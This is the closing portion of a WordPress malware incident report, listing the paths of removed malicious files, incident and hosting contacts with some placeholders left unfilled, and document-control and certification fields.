/wp-content/plugins/wp-mail-smtp/assets/images/7y3d6ibs [ELF 32-bit]
... (10+ additional files)
```

**Other Locations:**
```
/wp-content/upgrade/e17502bf/upgrade/9i3hibrt [Perl script]
/tmp/.ptr [Temporary execution file - deleted]
/tmp/.factor [Temporary execution file - deleted]
```

**Total Malware Files:** 40+ files removed

---

## Appendix C: Contact Information

### Incident Response Team
- **Primary Administrator:** amk (test@gmail.com)
- **Technical Contact:** (Add contact info)

### Hosting Provider
- **Company:** (Your hosting provider name)
- **Account:** proptech / smaug.cygnusdns.com
- **Support:** (Add support contact)
- **cPanel:** https://proptech.org.my:2083/

### Security Resources
- **Wordfence Support:** https://www.wordfence.com/help/
- **CyberSecurity Malaysia:** 1-300-88-2999
- **Emergency Response:** (Add local cybersecurity contact)

---

## Document Control

**Report Version:** 1.0  
**Date Created:** October 24, 2025  
**Last Updated:** October 24, 2025 19:50 MYR  
**Classification:** CONFIDENTIAL - Internal Use Only  
**Retention Period:** 7 years (as per incident response policy)  
**Author:** System Administrator (amk)  
**Reviewed By:** (Pending review)  
**Approved By:** (Pending approval)

---

## Certification

I certify that this report accurately reflects the security incident investigation findings based on available evidence as of October 24, 2025.

**Prepared by:** amk  
**Date:** October 24, 2025  
**Signature:** ________________________

---

**END OF REPORT**

*This report contains sensitive security information and should be handled according to your organization's data classification policy.*

